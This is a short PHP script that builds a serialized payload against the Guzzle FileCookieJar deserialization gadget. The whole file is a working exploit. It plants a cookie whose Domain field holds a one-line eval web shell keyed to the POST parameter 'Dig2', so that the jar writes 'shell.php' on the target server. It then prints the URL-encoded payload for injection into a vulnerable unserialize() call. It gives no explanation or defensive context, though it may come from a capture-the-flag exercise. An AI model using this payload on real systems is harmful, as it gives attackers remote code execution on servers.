<?php
// 3.php
namespace{
    require "./vendor/autoload.php";
    $a = new \GuzzleHttp\Cookie\FileCookieJar("shell.php");
    $a->setCookie(new \GuzzleHttp\Cookie\SetCookie([
        'Name'=>'123',
        'Domain'=> "<?php eval(\$_POST['Dig2']) ?>",
        'Expires'=>123,
        'Value'=>123
    ]));
    print(urlencode(serialize($a)));
}